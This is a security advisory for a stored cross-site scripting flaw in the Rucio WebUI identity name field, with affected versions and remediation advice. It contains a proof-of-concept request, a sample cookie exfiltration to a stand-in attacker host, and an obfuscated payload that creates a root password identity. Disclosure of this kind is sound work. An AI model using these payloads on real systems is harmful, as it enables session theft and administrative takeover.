# [M] Rucio WebUI has a Stored Cross-site Scripting (XSS) vulnerability its Identity Name

## Summary
Severity: Medium
Advisory: GHSA-8wpv-6x3f-3rm5
CVE: CVE-2026-25735
CWE: CWE-1004, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-8wpv-6x3f-3rm5
Type: github-advisory

## Affected
- PyPI: `rucio-webui` — affected >=0 <35.8.3
- PyPI: `rucio-webui` — affected >=36.0.0rc1 <38.5.4
- PyPI: `rucio-webui` — affected >=39.0.0rc1 <39.3.1

## Details
### Summary
A stored Cross-site Scripting (XSS) vulnerability was identified in the Identity Name of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.

---
### Details
The identity name is stored and later rendered without output encoding.

**Create Path**:  
Admin > Account Management > _ACCOUNT NAME_ > Add Account Identity

**Trigger Path**:  
Admin > Account Management > _ACCOUNT NAME_  
(`https://127.0.0.1:8443/ui/account?account=pentest`)

**Request**
```http
POST /proxy/accounts/pentest/identities HTTP/1.1
...
{"identity":"<script>alert(document.cookie)</script>","authtype":"SSH","email":"Test"}
```

**Response**
```http
HTTP/1.1 201 CREATED
...
Created
```

**Storing XSS payload in account identity name**
<img width="1385" height="807" alt="Storing XSS payload in account identity name" src="https://github.com/user-attachments/assets/e4209ef4-fd88-492f-9fb0-afb7d04b15ce" />

**Triggering XSS payload when viewing account**
<img width="1395" height="745" alt="Triggering XSS payload when viewing account" src="https://github.com/user-attachments/assets/e6217669-a0f7-4aba-bb05-f4fb7049611c" />

---
### Impact
Any authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.

The impact is amplified by:
- Session cookies that are accessible to JavaScript (missing HttpOnly flag).
- API tokens exposed to the WebUI via JavaScript variables.

An attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).

Attackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.

**XSS Payload to Create Root UserPass**
```html
<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>
```

---
### Remediation / Mitigation
All client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.

Additional defense-in-depth measures include:
- Enforcing a strict Content Security Policy (CSP).
- Setting the HttpOnly flag on session cookies.
- Avoiding exposure of API tokens in JavaScript-accessible variables.

> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = "root-root-webui-...:"` (See `/ui/list_accounts` for example)

---
### References
- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## References
- https://github.com/rucio/rucio/security/advisories/GHSA-8wpv-6x3f-3rm5
- https://nvd.nist.gov/vuln/detail/CVE-2026-25735
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://github.com/rucio/rucio
- https://github.com/rucio/rucio/releases/tag/35.8.3
- https://github.com/rucio/rucio/releases/tag/38.5.4
- https://github.com/rucio/rucio/releases/tag/39.3.1
